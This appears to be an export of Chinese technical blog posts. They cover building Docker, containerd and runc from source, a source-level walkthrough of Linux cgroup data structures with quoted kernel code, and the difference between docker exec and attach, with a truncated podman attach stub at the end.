一番操作完毕后，终于可以进入我们的正题了，这里，我们进入源码的文件夹中，开启terminal，执行构建任务 1sudo make BIND_DIR=. shell 因为这里会有网络的问题，所以我们修改dockerfile 在dockerfile中有涉及到go语言的，比如 1GOBIN=/build/ GO111MODULE=on go install &quot;github.com/pelletier/go-toml/cmd/tomll@$&#123;GOTOML_VERSION&#125;&quot; \\ 在其中加入 1GOPROXY=https://goproxy.cn 修改完毕之后继续执行构建，这步时间会比较长，构建完毕会进入一个容器，运行如下指令 1hack/make.sh binary install-binary 然后使用如下指令启动dockerd 1dockerd -D &amp; 之后我们可以使用docker version查看docker的信息 Client: Version: 24.0.2 API version: 1.43 Go version: go1.20.4 Git commit: cb74dfc Built: Thu May 25 21:50:49 2023 OS&#x2F;Arch: linux&#x2F;amd64 Context: default Server: Engine: Version: dev API version: 1.44 (minimum version 1.24) Go version: go1.21.5 Git commit: afc7e581e601d53d3b346828bd94ac1fed1e226d-unsupported Built: Thu Jan 11 01:11:13 2024 OS&#x2F;Arch: linux&#x2F;amd64 Experimental: false containerd: Version: v1.7.11 GitCommit: 64b8a811b07ba6288238eefc14d898ee0b5b99ba runc: Version: 1.1.11 GitCommit: v1.1.11-0-g4bccb38 docker-init: Version: 0.19.0 GitCommit: de40ad0 这里的server下的version是dev，编译时间是刚刚，说明我们编译成功 现在我们可以修改源码，然后再次使用指令 1hack/make.sh binary install-binary 直接binary 1make binary 就可以在 bundles&#x2F;binary-daemon 目录下就能找到 dockerd这个可执行文件 接着我们需要执行 systemctl stop docker 和 systemctl stop docker.socket 停止原来的 docker 服务。 然后运行.&#x2F;dockerd就可以执行了 1./dockerd containerd将containerd clone到本地 1git clone git@github.com:containerd/containerd.git 然后 1make 1sudo make install runc将runc clone到本地 1git clone git@github.com:opencontainers/runc.git 然后 1make 1sudo make install","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"学习 Linux Cgroup 源码分析","slug":"学习-Linux-Cgroup-源码分析","date":"2024-01-10T02:20:06.000Z","updated":"2024-01-23T08:45:59.905Z","comments":true,"path":"2024/01/10/学习-Linux-Cgroup-源码分析/","link":"","permalink":"http://example.com/2024/01/10/%E5%AD%A6%E4%B9%A0-Linux-Cgroup-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"Cgroup是什么Cgroups 是 control groups 的缩写，是 Linux 内核提供的一种可以限制、记录、隔离进程组（process groups）所使用的物理资源（如：cpu,memory,IO 等等）的机制。最初由 google 的工程师提出，后来被整合进 Linux 内核。Cgroups 也是 LXC 为实现虚拟化所使用的资源管理手段，可以说没有 cgroups 就没有 LXC。 Cgroup可以做什么","text":"Cgroup是什么Cgroups 是 control groups 的缩写，是 Linux 内核提供的一种可以限制、记录、隔离进程组（process groups）所使用的物理资源（如：cpu,memory,IO 等等）的机制。最初由 google 的工程师提出，后来被整合进 Linux 内核。Cgroups 也是 LXC 为实现虚拟化所使用的资源管理手段，可以说没有 cgroups 就没有 LXC。 Cgroup可以做什么Cgroups 最初的目标是为资源管理提供的一个统一的框架，既整合现有的 cpuset 等子系统，也为未来开发新的子系统提供接口。现在的 cgroups 适用于多种应用场景，从单个进程的资源控制，到实现操作系统层次的虚拟化（OS Level Virtualization）。Cgroups 提供了一下功能：1.限制进程组可以使用的资源数量（Resource limiting ）。比如：memory 子系统可以为进程组设定一个 memory 使用上限，一旦进程组使用的内存达到限额再申请内存，就会出发 OOM（out of memory）。2.进程组的优先级控制（Prioritization ）。比如：可以使用 cpu 子系统为某个进程组分配特定cpu share。3.记录进程组使用的资源数量（Accounting ）。比如：可以使用 cpuacct 子系统记录某个进程组使用的 cpu 时间4.进程组隔离（isolation）。比如：使用 ns 子系统可以使不同的进程组使用不同的 namespace，以达到隔离的目的，不同的进程组有各自的进程、网络、文件系统挂载空间。5.进程组控制（control）。比如：使用 freezer 子系统可以将进程组挂起和恢复。 Cgroups 相关概念及其关系相关概念1.任务（task）。在 cgroups 中，任务就是系统的一个进程。2.控制族群（control group）。控制族群就是一组按照某种标准划分的进程。Cgroups 中的资源控制都是以控制族群为单位实现。一个进程可以加入到某个控制族群，也从一个进程组迁移到另一个控制族群。一个进程组的进程可以使用 cgroups 以控制族群为单位分配的资源，同时受到 cgroups 以控制族群为单位设定的限制。3.层级（hierarchy）。控制族群可以组织成 hierarchical 的形式，既一颗控制族群树。控制族群树上的子节点控制族群是父节点控制族群的孩子，继承父控制族群的特定的属性。4.子系统（subsytem）。一个子系统就是一个资源控制器，比如 cpu 子系统就是控制 cpu 时间分配的一个控制器。子系统必须附加（attach）到一个层级上才能起作用，一个子系统附加到某个层级以后，这个层级上的所有控制族群都受到这个子系统的控制。 cgroup层级（Hierarchy）内核使用 cgroup 结构体来表示一个 control group 对某一个或者某几个 cgroups 子系统的资源限制。cgroup 结构体可以组织成一颗树的形式，每一棵cgroup 结构体组成的树称之为一个 cgroups 层级结构。cgroups层级结构可以 attach 一个或者几个 cgroups 子系统，当前层级结构可以对其 attach 的 cgroups 子系统进行资源的限制。每一个 cgroups 子系统只能被 attach 到一个 cpu 层级结构中。 比如上图表示两个cgroups层级结构，每一个层级结构中是一颗树形结构，树的每一个节点是一个 cgroup 结构体（比如cpu_cgrp, memory_cgrp)，最新版本内核貌似是cgroup_subsys_state结构体。第一个 cgroups 层级结构 attach 了 cpu 子系统和 cpuacct 子系统， 当前 cgroups 层级结构中的 cgroup 结构体就可以对 cpu 的资源进行限制，并且对进程的 cpu 使用情况进行统计。 第二个 cgroups 层级结构 attach 了 memory 子系统，当前 cgroups 层级结构中的 cgroup 结构体就可以对 memory 的资源进行限制。 在每一个 cgroups 层级结构中，每一个节点（cgroup 结构体）可以设置对资源不同的限制权重。比如上图中 cgrp1 组中的进程可以使用60%的 cpu 时间片，而 cgrp2 组中的进程可以使用20%的 cpu 时间片。 cgroups与进程上面的小节提到了内核使用 cgroups 子系统对系统的资源进行限制，也提到了 cgroups 子系统需要 attach 到 cgroups 层级结构中来对进程进行资源控制。本小节重点关注一下内核是如何把进程与 cgroups 层级结构联系起来的。 在创建了 cgroups 层级结构中的节点（cgroup 结构体）之后，可以把进程加入到某一个节点的控制任务列表中，一个节点的控制列表中的所有进程都会受到当前节点的资源限制。同时某一个进程也可以被加入到不同的 cgroups 层级结构的节点中，因为不同的 cgroups 层级结构可以负责不同的系统资源。所以说进程和 cgroup 结构体是一个多对多的关系。 上面这个图从整体结构上描述了进程与 cgroups 之间的关系。最下面的P代表一个进程。每一个进程的描述符中有一个指针指向了一个辅助数据结构css_set（cgroups subsystem set）。 指向某一个css_set的进程会被加入到当前css_set的进程链表中。一个进程只能隶属于一个css_set，一个css_set可以包含多个进程，隶属于同一css_set的进程受到同一个css_set所关联的资源限制。 上图中的”M×N Linkage”说明的是css_set通过辅助数据结构可以与 cgroups 节点进行多对多的关联。但是 cgroups 的实现不允许css_set同时关联同一个cgroups层级结构下多个节点。 这是因为 cgroups 对同一种资源不允许有多个限制配置。 一个css_set关联多个 cgroups 层级结构的节点时，表明需要对当前css_set下的进程进行多种资源的控制。而一个 cgroups 节点关联多个css_set时，表明多个css_set下的进程列表受到同一份资源的相同限制。 相互关系 一个层级可以附加多个子系统。 cpu 和 memory 子系统（或任意数量的子系统）可以附加到单个层级 一个子系统最多只能附加到一个层级。 如果两个不同的层级之一已经附加了 memory 子系统，则 cpu 子系统永远无法附加到这个层级。 规则3 默认控制组（根控制组）： 每当创建一个新的层级时，系统上的所有任务（进程）最初都属于该层级的默认控制组，即根控制组。 这个根控制组是组织和管理层级内任务的起点。 单一层次结构规则： 在特定的层级中（例如，cpu_mem_cg或net），每个任务可以成为该层级内一个控制组的成员。 任务可以是多个控制组的成员，但前提是这些控制组属于不同的层级 在同一层次结构中切换控制组： 任务可以是多个控制组的成员，但一旦它成为同一层级中第二个控制组的成员，它就会从第一个控制组中移除。 httpd 进程所属的 cpu_mem_cg 中的 cgroup 可能会将其 CPU 时间限制为分配给其他进程的一半，并将其内存使用限制为最大 1024 MB。此外， httpd 进程所属的 net 中的 cgroup 可能会将其传输速率限制为 30 MB&#x2F;s（兆字节每秒）。 在系统中，当一个进程（任务）通过fork操作生成一个子任务时，子任务会自动继承父任务所属的cgroup成员资格，但随后可以根据需要将其移动到不同的cgroup中。一旦进行了fork操作，父进程和子进程变得完全独立。 以一个httpd任务为例，它是在cpu_and_mem层次结构中名为half_cpu_1gb_max的cgroup的成员，同时也是在net层次结构中名为trans_rate_30的cgroup的成员。当这个httpd进程通过fork操作生成子进程时，子进程会自动成为half_cpu_1gb_max cgroup和trans_rate_30 cgroup的成员，继承与其父任务完全相同的cgroup成员资格。 从此刻开始，父任务和子任务变得完全独立：改变一个任务所属的cgroup不会影响另一个任务，而且改变父任务的cgroup也不会以任何方式影响其任何孙子任务。 Cgroups子系统介绍blkio – 这个子系统为块设备设定输入&#x2F;输出限制，比如物理设备（磁盘，固态硬盘，USB 等等）。cpu – 这个子系统使用调度程序提供对 CPU 的 cgroup 任务访问。cpuacct – 这个子系统自动生成 cgroup 中任务所使用的 CPU 报告。cpuset – 这个子系统为 cgroup 中的任务分配独立 CPU（在多核系统）和内存节点。devices – 这个子系统可允许或者拒绝 cgroup 中的任务访问设备。freezer – 这个子系统挂起或者恢复 cgroup 中的任务。memory – 这个子系统设定 cgroup 中任务使用的内存限制，并自动生成由那些任务使用的内存资源报告。net_cls – 这个子系统使用等级识别符（classid）标记网络数据包，可允许 Linux 流量控制程序（tc）识别从具体 cgroup 中生成的数据包。ns – 名称空间子系统。 Cgroups实现数据结构我们从进程出发来剖析 cgroups 相关数据结构之间的关系。在 Linux 中，管理进程的数据结构是 task_struct，其中与 cgroups 有关的： sched.h - include&#x2F;linux&#x2F;sched.h - Linux source code (v6.6.7) - Bootlin 12345678910struct task_struct &#123; ...#ifdef CONFIG_CGROUPS /* Control Group info protected by css_set_lock: */ struct css_set __rcu *cgroups; /* cg_list protected by css_set_lock and tsk-&gt;alloc_lock: */ struct list_head cg_list;#endif ...&#125; 其中cgroups指针指向了一个css_set结构，而css_set存储了与进程相关的cgroups信息,也就是说cgroup指向的是进程所属的css_set。 cg_list是一个嵌入的list_head结构，用于将连到同一个css_set的进程组织成一个链表。下面我们来看css_set的结构： css_setcgroup-defs.h - include&#x2F;linux&#x2F;cgroup-defs.h - Linux source code (v6.6.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596/* * A css_set is a structure holding pointers to a set of * cgroup_subsys_state objects. This saves space in the task struct * object and speeds up fork()/exit(), since a single inc/dec and a * list_add()/del() can bump the reference count on the entire cgroup * set for a task. */struct css_set &#123; /* * Set of subsystem states, one for each subsystem. This array is * immutable after creation apart from the init_css_set during * subsystem registration (at boot time). */ struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT]; /* reference count */ refcount_t refcount; /* * For a domain cgroup, the following points to self. If threaded, * to the matching cset of the nearest domain ancestor. The * dom_cset provides access to the domain cgroup and its csses to * which domain level resource consumptions should be charged. */ struct css_set *dom_cset; /* the default cgroup associated with this css_set */ struct cgroup *dfl_cgrp; /* internal task count, protected by css_set_lock */ int nr_tasks; /* * Lists running through all tasks using this cgroup group. * mg_tasks lists tasks which belong to this cset but are in the * process of being migrated out or in. Protected by * css_set_lock, but, during migration, once tasks are moved to * mg_tasks, it can be read safely while holding cgroup_mutex. */ struct list_head tasks; struct list_head mg_tasks; struct list_head dying_tasks; /* all css_task_iters currently walking this cset */ struct list_head task_iters; /* * On the default hierarchy, -&gt;subsys[ssid] may point to a css * attached to an ancestor instead of the cgroup this css_set is * associated with. The following node is anchored at * -&gt;subsys[ssid]-&gt;cgroup-&gt;e_csets[ssid] and provides a way to * iterate through all css&#x27;s attached to a given cgroup. */ struct list_head e_cset_node[CGROUP_SUBSYS_COUNT]; /* all threaded csets whose -&gt;dom_cset points to this cset */ struct list_head threaded_csets; struct list_head threaded_csets_node; /* * List running through all cgroup groups in the same hash * slot. Protected by css_set_lock */ struct hlist_node hlist; /* * List of cgrp_cset_links pointing at cgroups referenced from this * css_set. Protected by css_set_lock. */ struct list_head cgrp_links; /* * List of csets participating in the on-going migration either as * source or destination. Protected by cgroup_mutex. */ struct list_head mg_src_preload_node; struct list_head mg_dst_preload_node; struct list_head mg_node; /* * If this cset is acting as the source of migration the following * two fields are set. mg_src_cgrp and mg_dst_cgrp are * respectively the source and destination cgroups of the on-going * migration. mg_dst_cset is the destination cset the target tasks * on this cset should be migrated to. Protected by cgroup_mutex. */ struct cgroup *mg_src_cgrp; struct cgroup *mg_dst_cgrp; struct css_set *mg_dst_cset; /* dead and being drained, ignore for migration */ bool dead; /* For RCU-protected deletion */ struct rcu_head rcu_head;&#125;; refcount是该css_set的引用数，因为一个css_set可以被多个进程共用，只要这些进程的cgroups信息相同，比如：在所有已创建的层级里面都在同一个cgroup里的进程,如果子系统有引用到这个css_set则计数+1。 nrtasks是指向该css_set的进程数 hlist是嵌入的hlist_node，用于把所有css_set组织成一个hash表，这样内核可以快速查找特定的css_set。 tasks指向所有连到此css_set的进程连成的链表。 cgrp_links 是指向一个 struct cgrp_cset_link 连成的链表 Subsys 是一个指针数组，存储一组指向 cgroup_subsys_state 的 指 针 。 一个cgroup_subsys_state（css）就是进程与一个特定子系统相关的信息。通过这个指针数组，进程就可以获得相应的cgroup控制信息了。这个结构体代表了css_set和子系统的多对多。CGROUP_SUBSYS_COUNT 是内核中支持子系统的最大值;每一个 cgroup_subsys_state 存储的是进程的某一个子系统的相关信息。 下面我们就来看cgroup_subsys_state的结构： cgroup_subsys_statecgroup-defs.h - include&#x2F;linux&#x2F;cgroup-defs.h - Linux source code (v6.6.7) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* * Per-subsystem/per-cgroup state maintained by the system. This is the * fundamental structural building block that controllers deal with. * * Fields marked with &quot;PI:&quot; are public and immutable and may be accessed * directly without synchronization. */struct cgroup_subsys_state &#123; /* PI: the cgroup that this css is attached to */ struct cgroup *cgroup; /* PI: the cgroup subsystem that this css is attached to */ struct cgroup_subsys *ss; /* reference count - access via css_[try]get() and css_put() */ struct percpu_ref refcnt; /* siblings list anchored at the parent&#x27;s -&gt;children */ struct list_head sibling; struct list_head children; /* flush target list anchored at cgrp-&gt;rstat_css_list */ struct list_head rstat_css_node; /* * PI: Subsys-unique ID. 0 is unused and root is always 1. The * matching css can be looked up using css_from_id(). */ int id; unsigned int flags; /* * Monotonically increasing unique serial number which defines a * uniform order among all csses. It&#x27;s guaranteed that all * -&gt;children lists are in the ascending order of -&gt;serial_nr and * used to allow interrupting and resuming iterations. */ u64 serial_nr; /* * Incremented by online self and children. Used to guarantee that * parents are not offlined before their children. */ atomic_t online_cnt; /* percpu_ref killing and RCU release */ struct work_struct destroy_work; struct rcu_work destroy_rwork; /* * PI: the parent css. Placed here for cache proximity to following * fields of the containing structure. */ struct cgroup_subsys_state *parent;&#125;; refcnt是该cgroup_subsys_state引用的次数，只有当这个参数为0时，该数据结构才能被释放。 sibling，children 和 parent 将同一层级的 cgroup 连接层一颗树。 cgroup 是指向 struct cgroup 的一个指针，也就是进程属于的 cgroup。对于用户来说，即 cgroups 中的目录。一个 struct cgroup 存储了一个目录的相关信息。 ss 是指向 struct cgroup_subsys 的一个指针，里面主要是一些钩子函数的定义，涉及 cgroups 用户态地一系列操作，对应的具体实现在对应的子系统中。 进程受到子系统的控制，实际上是通过加入到特定的cgroup实现的，因为cgroup在特定的层级上，而子系统又是附加到层级上的 。 通过以上三个结构 ， 进程就可以和cgroup 连 接 起 来 了 ：task_struct-&gt;css_set-&gt;cgroup_subsys_state-&gt;cgroup。下面我们再来看cgroup的结构： cgroupcgroup-defs.h - include&#x2F;linux&#x2F;cgroup-defs.h - Linux source code (v6.6.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139struct cgroup &#123; /* self css with NULL -&gt;ss, points back to this cgroup */ struct cgroup_subsys_state self; unsigned long flags; /* &quot;unsigned long&quot; so bitops work */ /* * The depth this cgroup is at. The root is at depth zero and each * step down the hierarchy increments the level. This along with * ancestors[] can determine whether a given cgroup is a * descendant of another without traversing the hierarchy. */ int level; /* Maximum allowed descent tree depth */ int max_depth; /* * Keep track of total numbers of visible and dying descent cgroups. * Dying cgroups are cgroups which were deleted by a user, * but are still existing because someone else is holding a reference. * max_descendants is a maximum allowed number of descent cgroups. * * nr_descendants and nr_dying_descendants are protected * by cgroup_mutex and css_set_lock. It&#x27;s fine to read them holding * any of cgroup_mutex and css_set_lock; for writing both locks * should be held. */ int nr_descendants; int nr_dying_descendants; int max_descendants; /* * Each non-empty css_set associated with this cgroup contributes * one to nr_populated_csets. The counter is zero iff this cgroup * doesn&#x27;t have any tasks. * * All children which have non-zero nr_populated_csets and/or * nr_populated_children of their own contribute one to either * nr_populated_domain_children or nr_populated_threaded_children * depending on their type. Each counter is zero iff all cgroups * of the type in the subtree proper don&#x27;t have any tasks. */ int nr_populated_csets; int nr_populated_domain_children; int nr_populated_threaded_children; int nr_threaded_children; /* # of live threaded child cgroups */ struct kernfs_node *kn; /* cgroup kernfs entry */ struct cgroup_file procs_file; /* handle for &quot;cgroup.procs&quot; */ struct cgroup_file events_file; /* handle for &quot;cgroup.events&quot; */ /* handles for &quot;&#123;cpu,memory,io,irq&#125;.pressure&quot; */ struct cgroup_file psi_files[NR_PSI_RESOURCES]; /* * The bitmask of subsystems enabled on the child cgroups. * -&gt;subtree_control is the one configured through * &quot;cgroup.subtree_control&quot; while -&gt;subtree_ss_mask is the effective * one which may have more subsystems enabled. Controller knobs * are made available iff it&#x27;s enabled in -&gt;subtree_control. */ u16 subtree_control; u16 subtree_ss_mask; u16 old_subtree_control; u16 old_subtree_ss_mask; /* Private pointers for each registered subsystem */ struct cgroup_subsys_state __rcu *subsys[CGROUP_SUBSYS_COUNT]; struct cgroup_root *root; /* * List of cgrp_cset_links pointing at css_sets with tasks in this * cgroup. Protected by css_set_lock. */ struct list_head cset_links; /* * On the default hierarchy, a css_set for a cgroup with some * susbsys disabled will point to css&#x27;s which are associated with * the closest ancestor which has the subsys enabled. The * following lists all css_sets which point to this cgroup&#x27;s css * for the given subsystem. */ struct list_head e_csets[CGROUP_SUBSYS_COUNT]; /* * If !threaded, self. If threaded, it points to the nearest * domain ancestor. Inside a threaded subtree, cgroups are exempt * from process granularity and no-internal-task constraint. * Domain level resource consumptions which aren&#x27;t tied to a * specific task are charged to the dom_cgrp. */ struct cgroup *dom_cgrp; struct cgroup *old_dom_cgrp; /* used while enabling threaded */ /* per-cpu recursive resource statistics */ struct cgroup_rstat_cpu __percpu *rstat_cpu; struct list_head rstat_css_list; /* cgroup basic resource statistics */ struct cgroup_base_stat last_bstat; struct cgroup_base_stat bstat; struct prev_cputime prev_cputime; /* for printing out cputime */ /* * list of pidlists, up to two for each namespace (one for procs, one * for tasks); created on demand. */ struct list_head pidlists; struct mutex pidlist_mutex; /* used to wait for offlining of csses */ wait_queue_head_t offline_waitq; /* used to schedule release agent */ struct work_struct release_agent_work; /* used to track pressure stalls */ struct psi_group *psi; /* used to store eBPF programs */ struct cgroup_bpf bpf; /* If there is block congestion on this cgroup. */ atomic_t congestion_count; /* Used to store internal freezer state */ struct cgroup_freezer_state freezer;#ifdef CONFIG_BPF_SYSCALL struct bpf_local_storage __rcu *bpf_cgrp_storage;#endif /* All ancestors including self */ struct cgroup *ancestors[];&#125;; self 指向的 cgroup_subsys_state 为当 struct cgroup_subsys_state 中 ss 为 NULL 时的结构体，存储的是当前 cgroup 本身的一些信息。 subsys 是一组指向 cgroup_subsys_state 的指针，存储的是当前目录锁绑定的子系统的信息。 cset_links 指向一个由 struct cgrp_cset_links 连成的链表。 root 指向一个 struct cgroup_root 的结构，存储了 root cgroup 中的信息。 cgroup_rootcgroup-defs.h - include&#x2F;linux&#x2F;cgroup-defs.h - Linux source code (v6.6.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839/* * A cgroup_root represents the root of a cgroup hierarchy, and may be * associated with a kernfs_root to form an active hierarchy. This is * internal to cgroup core. Don&#x27;t access directly from controllers. */struct cgroup_root &#123; struct kernfs_root *kf_root; /* The bitmask of subsystems attached to this hierarchy */ unsigned int subsys_mask; /* Unique id for this hierarchy. */ int hierarchy_id; /* * The root cgroup. The containing cgroup_root will be destroyed on its * release. cgrp-&gt;ancestors[0] will be used overflowing into the * following field. cgrp_ancestor_storage must immediately follow. */ struct cgroup cgrp; /* must follow cgrp for cgrp-&gt;ancestors[0], see above */ struct cgroup *cgrp_ancestor_storage; /* Number of cgroups in the hierarchy, used only for /proc/cgroups */ atomic_t nr_cgrps; /* A list running through the active hierarchies */ struct list_head root_list; /* Hierarchy-specific flags */ unsigned int flags; /* The path to use for release notifications. */ char release_agent_path[PATH_MAX]; /* The name for this hierarchy - may be empty */ char name[MAX_CGROUP_ROOT_NAMELEN];&#125;; 在初始化cgroup时会初始化这个结构。 cgroup.c - kernel&#x2F;cgroup&#x2F;cgroup.c - Linux source code (v6.6.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536/** * cgroup_init_early - cgroup initialization at system boot * * Initialize cgroups at system boot, and initialize any * subsystems that request early init. */int __init cgroup_init_early(void)&#123; static struct cgroup_fs_context __initdata ctx; struct cgroup_subsys *ss; int i; ctx.root = &amp;cgrp_dfl_root; init_cgroup_root(&amp;ctx); cgrp_dfl_root.cgrp.self.flags |= CSS_NO_REF; RCU_INIT_POINTER(init_task.cgroups, &amp;init_css_set); for_each_subsys(ss, i) &#123; WARN(!ss-&gt;css_alloc || !ss-&gt;css_free || ss-&gt;name || ss-&gt;id, &quot;invalid cgroup_subsys %d:%s css_alloc=%p css_free=%p id:name=%d:%s\\n&quot;, i, cgroup_subsys_name[i], ss-&gt;css_alloc, ss-&gt;css_free, ss-&gt;id, ss-&gt;name); WARN(strlen(cgroup_subsys_name[i]) &gt; MAX_CGROUP_TYPE_NAMELEN, &quot;cgroup_subsys_name %s too long\\n&quot;, cgroup_subsys_name[i]); ss-&gt;id = i; ss-&gt;name = cgroup_subsys_name[i]; if (!ss-&gt;legacy_name) ss-&gt;legacy_name = cgroup_subsys_name[i]; if (ss-&gt;early_init) cgroup_init_subsys(ss, true); &#125; return 0;&#125; 这个函数初始化的 cgroup_root 是一个全局的变量。定义在 kernel&#x2F;cgroup.c 中。 那为什么cgroup和css_set是多对多的关系呢？一个进程对应css_set，一个css_set就存储了一组进程（应该有可能被几个进程共享，所以是一组）跟各个子系统相关的信息，但是这些信息有可能不是从一个cgroup那里获得的，因为一个进程可以同时属于几个cgroup，只要这些cgroup不在同一个层级。举个例子：我们创建一个层级A，A上面附加了cpu和memory两个子系统，进程B属于A的根cgroup；然后我们再创建一个层级C，C上面附加了ns和blkio两个子系统，进程B同样属于C的根cgroup；那么进程B对应的cpu和memory的信息是从A的根cgroup获得的，ns和blkio信息则是从C的根cgroup获得的。因此，一个css_set存储的cgroup_subsys_state可以对应多个cgroup。另一方面，cgroup也存储了一组cgroup_subsys_state，这一组cgroup_subsys_state则是cgroup从所在的层级附加的子系统获得的。一个cgroup中可以有多个进程，而这些进程的css_set不一定都相同，因为有些进程可能还加入了其他 cgroup 。但是同一个 cgroup 中的进程与该 cgroup 关联的cgroup_subsys_state都受到该cgroup的管理（cgroups中进程控制是以cgroup为单位的）的，所以一个cgrouop也可以对应多个css_set。 多对多关系实现1 个 cgroup 中有多个进程，每一个进程可能对应不同的 scss_set，所以 1 个 cgroup 可能对应多个 css_set; 1 个 css_set 对应的进程，不同的子系统对应不同的目录，所以 1 个 css_set 对应多个 cgroup; 从 struct css_set 访问 struct cgroup：struct css_set-&gt;struct cgroup_subsys_state-&gt;struct cgroup; 反之用现有的结构体很难达到，所以要引入一个 struct cgrp_cset_link 的结构体将两者联系起来： cgrp_cset_linkcgroup-internal.h - kernel&#x2F;cgroup&#x2F;cgroup-internal.h - Linux source code (v6.6.7) - Bootlin 12345678910111213141516171819/* * A cgroup can be associated with multiple css_sets as different tasks may * belong to different cgroups on different hierarchies. In the other * direction, a css_set is naturally associated with multiple cgroups. * This M:N relationship is represented by the following link structure * which exists for each association and allows traversing the associations * from both sides. */struct cgrp_cset_link &#123; /* the cgroup and css_set this link associates */ struct cgroup *cgrp; struct css_set *cset; /* list of cgrp_cset_links anchored at cgrp-&gt;cset_links */ struct list_head cset_link; /* list of cgrp_cset_links anchored at css_set-&gt;cgrp_links */ struct list_head cgrp_link;&#125;; 再回到css_set和cgroup的结构体中，注意到： 12345struct css_set &#123; ... struct list_head cgrp_links; ...&#125; 12345struct cgroup &#123; ... struct list_head cset_link; ...&#125; 也就是每个css_set和cgroup结构体都与一个cgrp_cset_link结构体的链表链接。 结构如下图所示： 这张图解释了cgroup和subsystem之间的多对多关系。每个cgroup结构体可以通过cgroup-&gt;cset_links，找到一个cgrp_cset_link链表，每个cgrp_cset_link都有对于的css_set，这个css_set属于多个task_struct，其中包含subsystem。所以通过遍历这个链表就能找到这个cgroup对应的所有css_set，也即可以找到所有的cgroup下的所有task。 反之亦然，可以通过task_struct中的cgroups变量，找到task属于的所有cgroup 参考资料 Linux Cgroups 详解，王喆锋 openEuler Kernel 技术解读 |内核资源管理器 - cgroups-鸿蒙开发者社区-51CTO.COM Linux资源管理之cgroups简介 - 美团技术团队 (meituan.com)","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"Cgroup","slug":"Linux内核/Cgroup","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/Cgroup/"}],"tags":[]},{"title":"容器exec和attach的区别","slug":"容器exec和attach的区别","date":"2024-01-05T00:36:23.000Z","updated":"2024-01-05T01:24:46.514Z","comments":true,"path":"2024/01/05/容器exec和attach的区别/","link":"","permalink":"http://example.com/2024/01/05/%E5%AE%B9%E5%99%A8exec%E5%92%8Cattach%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"容器的exec和attach的命令都会进入到容器的shell中，比如podman exec,podman attach,docker exec,docker attach等等。本文以docker为例，其他的容器也是类似的。 各命令简介 docker run；创建和启动一个新的容器实例，操作对象是镜像，选项较多，如果你要创建和启动一个容器，只能用run； docker exec: 在已运行的容器中，执行命令，操作对象是容器，如果你要进入已运行的容器，并且执行命令，用exec；exec 可以开启多个终端实例， exec -i &#x2F;bin&#x2F;bash，由此可见exec其实是在运行中的容器中执行一个命令，比如&#x2F;bin&#x2F;bash 来达到交互的目的。 docker attach: 同样操作的是已运行的容器，可以将本机标准输入（键盘输入）输到容器中，也可以将容器的输出显示在本机的屏幕上，如果你想查看容器运行过程中产生的标准输入输出，用attach；attach 开启一个和正在运行的进程交互的终端，如果该进程结束，原docker container的进程也会结束。attach只可以用在以 &#x2F;bin&#x2F;bash 命令启动的容器， 比如 docker run ubuntu &#x2F;bin&#x2F;bash","text":"容器的exec和attach的命令都会进入到容器的shell中，比如podman exec,podman attach,docker exec,docker attach等等。本文以docker为例，其他的容器也是类似的。 各命令简介 docker run；创建和启动一个新的容器实例，操作对象是镜像，选项较多，如果你要创建和启动一个容器，只能用run； docker exec: 在已运行的容器中，执行命令，操作对象是容器，如果你要进入已运行的容器，并且执行命令，用exec；exec 可以开启多个终端实例， exec -i &#x2F;bin&#x2F;bash，由此可见exec其实是在运行中的容器中执行一个命令，比如&#x2F;bin&#x2F;bash 来达到交互的目的。 docker attach: 同样操作的是已运行的容器，可以将本机标准输入（键盘输入）输到容器中，也可以将容器的输出显示在本机的屏幕上，如果你想查看容器运行过程中产生的标准输入输出，用attach；attach 开启一个和正在运行的进程交互的终端，如果该进程结束，原docker container的进程也会结束。attach只可以用在以 &#x2F;bin&#x2F;bash 命令启动的容器， 比如 docker run ubuntu &#x2F;bin&#x2F;bash 区别简单来说：是否会启动一个新进程？ docker exec 进入容器后开启一个新的终端，可以在里面操作(常用) docker attach 进入容器正在执行的终端，不会启动新的进程 Docker attach和Docker exec之间的主要区别在于它们启动的进程以及它们的行为方式。Docker attach直接在容器的当前进程上启动一个终端，并将其连接到容器的标准输入、标准输出和标准错误。这意味着我们只能在容器当前运行的进程中进行操作，而且如果我们退出该终端，容器也会被终止。 相比之下，Docker exec在容器内启动一个新的进程，该进程可以在后台运行而不影响其他进程。这使得我们可以在不中断容器中正在运行的其他进程的情况下执行命令。 从命令的使用方式来看，Docker attach通常用于调试容器内部的应用程序，并且在需要交互式输入和输出的操作中非常有用。而Docker exec通常用于在容器中执行命令，在需要在容器内部执行复杂操作时尤其方便。 最后需要注意的是，在使用Docker attach时，需要小心避免因为关闭连接而导致容器终止。如果需要在容器中执行命令而不影响容器的运行状态，请使用Docker exec命令。因为exec的exit关闭的是exec启动的新进程而不会退出容器本身，而attach退出的是容器本身的进程。","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"}],"tags":[]},{"title":"","slug":"podman-attach-源码分析","date":"2024-01-04T08:10:35.990Z","updated":"2024-01-17T12:27:41.650Z","comments":true,"path":"2024/01/04/podman-attach-源码分析/","link":"","permalink":"http://example.com/2024/01/04/podman-attach-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"12345title: podman attach 源码分析date: 2023-12-24 15:57:14tags:categories: - 容器 initpodman&#x2F;cmd&#x2F;podman&#x2F;containers&#x2F;attach.go at main · containers&#x2F;podman (github.com)","text":"12345title: podman attach 源码分析date: 2023-12-24 15:57:14tags:categories: - 容器 